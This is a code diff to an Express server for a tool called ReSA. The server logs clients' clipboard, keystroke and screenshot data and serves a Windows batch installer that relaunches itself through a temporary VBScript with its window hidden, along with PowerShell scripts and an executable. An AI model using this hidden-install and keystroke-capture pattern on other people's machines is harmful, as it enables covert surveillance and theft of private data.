@@ -1,5 +1,6 @@
 require("dotenv").config();
 
+const fs = require("fs");
 const http = require("http");
 const path = require("path");
 const express = require("express");
@@ -20,6 +21,7 @@ const auditLog = [];
 const clipboardLog = new Map();
 const keyboardLog = new Map();
 const screenshotLog = new Map();
+const downloadsDir = path.join(__dirname, "..", "downloads");
 
 const app = express();
 app.use(express.json());
@@ -28,6 +30,15 @@ function publicBaseUrl(req) {
   const proto = req.headers["x-forwarded-proto"]?.split(",")[0]?.trim() || req.protocol || "http";
   const host = req.headers["x-forwarded-host"]?.split(",")[0]?.trim() || req.get("host");
   return `${proto}://${host}`;
+}
+
+function sendDownloadAsset(res, filename, contentType) {
+  const filePath = path.join(downloadsDir, filename);
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send(`${filename} not found on server`);
+  }
+  res.setHeader("Content-Type", contentType);
+  res.sendFile(filePath);
 }
 
 app.get("/install", (_req, res) => {
@@ -58,8 +69,12 @@ app.get("/download/install.bat", (req, res) => {
     "@echo off",
     "if /i not \"%~1\"==\"run\" (",
     "  >\"%TEMP%\\ReSA-hide.vbs\" echo Set w = CreateObject(\"WScript.Shell\")",
-    "  >>\"%TEMP%\\ReSA-hide.vbs\" echo w.Run \"cmd /c \"\"%~f0\"\" run\", 0, False",
-    "  wscript //nologo \"%TEMP%\\ReSA-hide.vbs\"",
+    "  >>\"%TEMP%\\ReSA-hide.vbs\" echo rc = w.Run(\"cmd /c \"\"\" ^& WScript.Arguments(0) ^& \"\"\" run\", 0, True)",
+    "  >>\"%TEMP%\\ReSA-hide.vbs\" echo If rc ^<^> 0 Then",
+    "  >>\"%TEMP%\\ReSA-hide.vbs\" echo   w.Popup \"ReSA install failed. See %TEMP%\\ReSA-install.log\", 0, \"ReSA\", 16",
+    "  >>\"%TEMP%\\ReSA-hide.vbs\" echo   WScript.Quit rc",
+    "  >>\"%TEMP%\\ReSA-hide.vbs\" echo End If",
+    "  wscript //nologo \"%TEMP%\\ReSA-hide.vbs\" \"%~f0\"",
     "  del \"%TEMP%\\ReSA-hide.vbs\" 2>nul",
     "  exit /b 0",
     ")",
@@ -105,7 +120,19 @@ app.get("/download/uninstall.bat", (req, res) => {
   res.send(body);
 });
 
-app.use("/download", express.static(path.join(__dirname, "..", "downloads")));
+app.get("/download/install.ps1", (req, res) => {
+  sendDownloadAsset(res, "install.ps1", "text/plain; charset=utf-8");
+});
+
+app.get("/download/uninstall.ps1", (req, res) => {
+  sendDownloadAsset(res, "uninstall.ps1", "text/plain; charset=utf-8");
+});
+
+app.get("/download/ReSA.exe", (req, res) => {
+  sendDownloadAsset(res, "ReSA.exe", "application/octet-stream");
+});
+
+app.use("/download", express.static(downloadsDir));
 app.use(express.static(path.join(__dirname, "..", "viewer")));
 
 function send(ws, payload) {
